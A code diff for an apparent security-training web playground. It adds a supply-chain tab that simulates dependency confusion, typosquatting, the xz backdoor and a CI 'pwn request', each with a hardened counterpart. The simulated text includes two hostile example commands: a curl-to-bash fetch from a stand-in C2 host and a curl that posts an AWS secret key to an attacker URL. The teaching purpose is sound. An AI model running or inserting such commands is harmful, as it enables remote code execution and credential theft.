@@ -880,6 +880,7 @@
     initEdr();
     initCrypto();
     initDfir();
+    renderSbom("dep_confusion");
   }
 
   function hidePlayground(){
@@ -890,7 +891,7 @@
   }
 
   function switchPlaygroundTab(tabName){
-    const validTabs = ["canbus", "sqli", "adcs", "jwt", "bgp", "oauth", "dbshield", "edr", "crypto", "dfir"];
+    const validTabs = ["canbus", "sqli", "adcs", "jwt", "bgp", "oauth", "dbshield", "edr", "crypto", "dfir", "sbom"];
     if (!validTabs.includes(tabName)) tabName = "canbus";
     document.querySelectorAll(".pg-tab").forEach(tab => {
       tab.classList.toggle("active", tab.getAttribute("data-tab") === tabName);
@@ -2374,6 +2375,218 @@
     timelineOut.textContent = timelineText;
   }
 
+  // --- 11. SBOM & Supply Chain Dependency Inspector ---
+  let currentSbomScenario = "dep_confusion";
+
+  function renderSbom(scenario){
+    if (scenario) currentSbomScenario = scenario;
+    const pkgEl = document.getElementById("sbomPkgInput");
+    const policyEl = document.getElementById("sbomPolicySelect");
+    const manifestBadge = document.getElementById("sbomManifestBadge");
+    const attestBadge = document.getElementById("sbomAttestBadge");
+    const manifestOut = document.getElementById("sbomManifestOutput");
+    const attestOut = document.getElementById("sbomAttestOutput");
+
+    if (!pkgEl || !policyEl || !manifestBadge || !attestBadge || !manifestOut || !attestOut) return;
+
+    if (scenario === "dep_confusion"){
+      pkgEl.value = "corp-auth-core";
+      policyEl.value = "default_unpinned";
+    } else if (scenario === "typosquat"){
+      pkgEl.value = "requsts";
+      policyEl.value = "default_unpinned";
+    } else if (scenario === "xz_backdoor"){
+      pkgEl.value = "liblzma-build-hook";
+      policyEl.value = "default_unpinned";
+    } else if (scenario === "pwn_request"){
+      pkgEl.value = "ci-actions-runner";
+      policyEl.value = "default_unpinned";
+    } else if (scenario === "slsa_clean"){
+      pkgEl.value = "registry.corp.internal/backend-api:v3.5.0";
+      policyEl.value = "slsa3_cosign_enforce";
+    }
+
+    const pkg = pkgEl.value.trim();
+    const policy = policyEl.value;
+    const mode = currentSbomScenario;
+
+    let manifestText = "";
+    let attestText = "";
+
+    if (mode === "dep_confusion"){
+      manifestText =
+        "[Dependency Manifest & Repository Precedence]:\n" +
+        "  Target Package: " + pkg + "\n" +
+        "  Internal Registry: https://nexus.corp.internal/pypi/simple (v1.2.0)\n" +
+        "  Public Index: https://pypi.org/simple (v99.0.0, Publisher: evil_actor_42)\n" +
+        "  Pip Command: pip install corp-auth-core --extra-index-url https://nexus.corp.internal/...\n" +
+        "[Vulnerability Evaluation]:\n" +
+        "  🚨 PRECEDENCE HIJACK DETECTED!\n" +
+        "  Pip resolver automatically fetched v99.0.0 from Public PyPI due to higher SemVer!\n" +
+        "  Malicious setup.py executed: Exfiltrated /etc/passwd to adversary endpoint.";
+
+      if (policy === "scoped_hash_pinned"){
+        manifestText += "\n\n[Mitigation Applied]:\n" +
+          "  ✓ Enforced scoped private index: index-url = https://nexus.corp.internal/...\n" +
+          "  ✓ Pinned exact hash: corp-auth-core==1.2.0 --hash=sha256:4a8f9c12...\n" +
+          "  ✓ Public index fallback blocked. Dependency confusion eliminated.";
+        attestText =
+          "[Cryptographic Admission Policy]:\n" +
+          "  - Repository Scope: @corp internal only\n" +
+          "  - Hash Pinning: STRICT SHA-256 ENFORCED\n" +
+          "  - Public Namespace Collision: REJECTED\n" +
+          "Verdict: 🟢 DEPENDENCY CONFUSION DEFENSE VERIFIED";
+        manifestBadge.textContent = "RESOLVED: PINNED";
+        manifestBadge.className = "token-tag token-lit";
+        attestBadge.textContent = "POLICY: COMPLIANT";
+        attestBadge.className = "token-tag token-lit";
+      } else {
+        attestText =
+          "[Cryptographic Admission Policy]:\n" +
+          "  - Repository Scope: Unrestricted\n" +
+          "  - Hash Pinning: DISABLED (Unpinned transitive fetch)\n" +
+          "  - Remote Attestation: NONE\n" +
+          "Verdict: 💥 DEPENDENCY CONFUSION EXPLOITATION DETECTED";
+        manifestBadge.textContent = "HAZARD: HIJACKED";
+        manifestBadge.className = "token-tag token-inj";
+        attestBadge.textContent = "POLICY: BREACHED";
+        attestBadge.className = "token-tag token-inj";
+      }
+
+    } else if (mode === "typosquat"){
+      manifestText =
+        "[Lexical Distance & Registry Inspection]:\n" +
+        "  Target Package: " + pkg + "\n" +
+        "  Legitimate Target: requests (Popularity: 50,000,000+ weekly downloads)\n" +
+        "  Levenshtein Distance: 1 (Single character omission 'e')\n" +
+        "  Release Timestamp: 2 hours ago by unverified author 'typo_squatter'\n" +
+        "[Payload Analysis]:\n" +
+        "  setup.py spawns subprocess: curl -s https://c2.evil-corp.net/beacon | bash";
+
+      if (policy === "scoped_hash_pinned" || policy === "slsa3_cosign_enforce"){
+        manifestText += "\n\n[Protection Engine]:\n" +
+          "  ✓ Levenshtein collision filter flagged package 'requsts'.\n" +
+          "  ✓ Package install blocked by enterprise software firewall.";
+        attestText =
+          "[Supply Chain Firewall]:\n" +
+          "  - Typosquatting Filter: TRIGGERED (Distance = 1)\n" +
+          "  - Download Quarantined: TRUE\n" +
+          "Verdict: 🛡️ TYPOSQUATTING INFECTION PREVENTED";
+        manifestBadge.textContent = "FILTER: BLOCKED";
+        manifestBadge.className = "token-tag token-lit";
+        attestBadge.textContent = "STATUS: QUARANTINED";
+        attestBadge.className = "token-tag token-lit";
+      } else {
+        attestText =
+          "[Supply Chain Firewall]:\n" +
+          "  - Typosquatting Filter: DISABLED\n" +
+          "  - Downloader Executed: Arbitrary remote script executed in developer context\n" +
+          "Verdict: 🚨 UNPROTECTED TYPOSQUATTING INFECTION";
+        manifestBadge.textContent = "ATTACK: TYPOSQUAT";
+        manifestBadge.className = "token-tag token-inj";
+        attestBadge.textContent = "POLICY: COMPROMISED";
+        attestBadge.className = "token-tag token-inj";
+      }
+
+    } else if (mode === "xz_backdoor"){
+      manifestText =
+        "[CycloneDX 1.6 SBOM Component Parsing]:\n" +
+        "  Component: " + pkg + " (Version: 5.6.1-patch1)\n" +
+        "  PURL: pkg:generic/liblzma-build-hook@5.6.1-patch1\n" +
+        "  Vulnerability: CVE-2024-3094 (CVSS 10.0 CRITICAL)\n" +
+        "  Artifact Hash: badc0de0000000000000000000000000000000000000000000000000deadbeef\n" +
+        "[Anomaly Investigation]:\n" +
+        "  - Obfuscated M4 macro test file injects backdoor into sshd RSA_public_decrypt.\n" +
+        "  - Hash mismatch against clean upstream vendor source tree!";
+
+      if (policy === "slsa3_cosign_enforce" || policy === "scoped_hash_pinned"){
+        manifestText += "\n\n[Hermetic Build Action]:\n" +
+          "  ✓ Upstream hash discrepancy triggered automatic quarantine.\n" +
+          "  ✓ Compromised build hook isolated from compiler toolchain.";
+        attestText =
+          "[Hermetic Provenance & Integrity Gate]:\n" +
+          "  - Source Verification: FAIL (Tampered release tarball)\n" +
+          "  - Build Admission: 403 FORBIDDEN (Compromised component isolated)\n" +
+          "Verdict: 🛡️ CVE-2024-3094 BACKDOOR ISOLATED & DEFENSE ENFORCED";
+        manifestBadge.textContent = "SBOM: QUARANTINED";
+        manifestBadge.className = "token-tag token-lit";
+        attestBadge.textContent = "ADMISSION: REJECTED";
+        attestBadge.className = "token-tag token-lit";
+      } else {
+        attestText =
+          "[Hermetic Provenance & Integrity Gate]:\n" +
+          "  - Source Verification: BYPASSED\n" +
+          "  - Build Hook: Injected binary payload into target sshd executable\n" +
+          "Verdict: 💥 CVE-2024-3094 BACKDOOR INJECTED INTO PRODUCTION";
+        manifestBadge.textContent = "SBOM: COMPROMISED";
+        manifestBadge.className = "token-tag token-inj";
+        attestBadge.textContent = "BUILD: POISONED";
+        attestBadge.className = "token-tag token-inj";
+      }
+
+    } else if (mode === "pwn_request"){
+      manifestText =
+        "[CI/CD Workflow Hazard Evaluation]:\n" +
+        "  Workflow: .github/workflows/ci.yml\n" +
+        "  Trigger: on.pull_request_target (Privileged context)\n" +
+        "  Checked-out Ref: ${{ github.event.pull_request.head.ref }} (Untrusted Fork!)\n" +
+        "  Exposed Secrets: AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN\n" +
+        "[Pwn Request Execution Trace]:\n" +
+        "  Adversary submitted PR modifying package.json test script:\n" +
+        "  curl -X POST https://c2.leak.net/ -d \"$AWS_SECRET_ACCESS_KEY\"";
+
+      if (policy === "slsa3_cosign_enforce" || policy === "scoped_hash_pinned"){
+        manifestText += "\n\n[Hardened Pipeline Architecture]:\n" +
+          "  ✓ Switched untrusted trigger to unprivileged 'pull_request'.\n" +
+          "  ✓ Secrets decoupled from fork PR checkout context.";
+        attestText =
+          "[CI/CD Security Isolation]:\n" +
+          "  - Fork Runner Privilege: UNPRIVILEGED READ-ONLY\n" +
+          "  - Secret Access: DENIED FOR FORK WORKFLOWS\n" +
+          "Verdict: 🛡️ PWN REQUEST MITIGATED & SECRETS PROTECTED";
+        manifestBadge.textContent = "RUNNER: HARDENED";
+        manifestBadge.className = "token-tag token-lit";
+        attestBadge.textContent = "SECRETS: SAFE";
+        attestBadge.className = "token-tag token-lit";
+      } else {
+        attestText =
+          "[CI/CD Security Isolation]:\n" +
+          "  - Fork Runner Privilege: PRIVILEGED WRITE ACCESS\n" +
+          "  - Secret Exfiltration: AWS credentials compromised\n" +
+          "Verdict: 🚨 CI/CD RUNNER POISONING (PWN REQUEST COMPROMISE)";
+        manifestBadge.textContent = "RUNNER: POISONED";
+        manifestBadge.className = "token-tag token-inj";
+        attestBadge.textContent = "SECRETS: LEAKED";
+        attestBadge.className = "token-tag token-inj";
+      }
+
+    } else { // slsa_clean
+      manifestText =
+        "[CycloneDX 1.6 Cryptographic SBOM Manifest]:\n" +
+        "  Artifact: " + pkg + "\n" +
+        "  Digest: sha256:4a8f9c12b7e53d0684a1e90f2b6c7d1e8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f\n" +
+        "  Components: 42 verified packages (0 critical CVEs)\n" +
+        "  Base Image: cgr.dev/chainguard/static:latest (Distroless minimal)\n" +
+        "  VEX Statement: All known vulnerabilities marked not_affected (unreachable)";
+
+      attestText =
+        "[Sigstore Cosign & SLSA Level 3 Attestation]:\n" +
+        "  - Issuer OIDC: https://token.actions.githubusercontent.com\n" +
+        "  - Workflow Subject: https://github.com/corp-org/backend-api/.github/workflows/build.yml\n" +
+        "  - Rekor Log Index: 12894562 (Inclusion Proof Verified!)\n" +
+        "  - SLSA Provenance: SLSA_BUILD_LEVEL_3 (Hermetic, Isolated, Parameterless)\n" +
+        "  - Admission Webhook: 200 OK (Deployment permitted to production cluster)\n" +
+        "Verdict: 🟢 100% SLSA L3 & REKOR CRYPTOGRAPHICALLY VERIFIED";
+      manifestBadge.textContent = "SBOM: CLEAN";
+      manifestBadge.className = "token-tag token-lit";
+      attestBadge.textContent = "SLSA: LEVEL 3 VERIFIED";
+      attestBadge.className = "token-tag token-lit";
+    }
+
+    manifestOut.textContent = manifestText;
+    attestOut.textContent = attestText;
+  }
+
   /* ===== export & import ===== */
   function exportJSON(){
     const payload = {
@@ -2649,6 +2862,8 @@
         openPlayground("crypto"); break;
       case "dfir": case "triage": case "timeline": case "forensics": case "ir": case "contain":
         openPlayground("dfir"); break;
+      case "sbom": case "supplychain": case "cosign": case "slsa": case "cyclonedx": case "dep":
+        openPlayground("sbom"); break;
       case "search": case "find": case "검색": doSearch(arg); break;
       case "export": case "backup": doExport(arg); break;
       case "import": case "restore": doImport(arg); break;
@@ -3133,6 +3348,28 @@
       audio();
       const p = btn.getAttribute("data-dfir-preset");
       renderDfir(p);
+    });
+  });
+
+  // SBOM Inspector Controls
+  const sbomScanBtn = document.getElementById("btnRunSbomAudit");
+  if (sbomScanBtn) sbomScanBtn.addEventListener("click", () => { audio(); renderSbom(); });
+  const sbomHardenBtn = document.getElementById("btnEnforceSbomHarden");
+  if (sbomHardenBtn) sbomHardenBtn.addEventListener("click", () => {
+    audio();
+    const sel = document.getElementById("sbomPolicySelect");
+    if (sel) sel.value = "scoped_hash_pinned";
+    renderSbom();
+  });
+  const sbomPkgInput = document.getElementById("sbomPkgInput");
+  if (sbomPkgInput) sbomPkgInput.addEventListener("input", () => renderSbom());
+  const sbomPolicySelect = document.getElementById("sbomPolicySelect");
+  if (sbomPolicySelect) sbomPolicySelect.addEventListener("change", () => renderSbom());
+  document.querySelectorAll("[data-sbom-preset]").forEach(btn => {
+    btn.addEventListener("click", () => {
+      audio();
+      const p = btn.getAttribute("data-sbom-preset");
+      renderSbom(p);
     });
   });
 
